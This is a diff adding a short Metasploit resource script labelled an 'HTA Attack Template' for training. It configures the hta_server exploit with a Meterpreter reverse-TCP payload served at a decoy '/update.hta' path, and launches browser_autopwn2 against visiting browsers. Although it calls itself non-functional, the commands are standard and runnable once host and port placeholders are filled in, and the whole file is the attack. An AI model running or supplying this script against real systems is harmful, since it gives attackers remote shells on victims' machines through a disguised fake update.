@@ -1,0 +1,18 @@
+# HTA Attack Template
+# For Training Use – Non-functional Template
+
+use exploit/windows/misc/hta_server
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <LHOST>
+set LPORT <LPORT>
+set SRVHOST <LHOST>
+set SRVPORT 8080
+set URIPATH /update.hta
+exploit -j
+
+use auxiliary/server/browser_autopwn2
+set LHOST <LHOST>
+set LPORT <LPORT>
+set SRVHOST <LHOST>
+set SRVPORT 80
+run -j
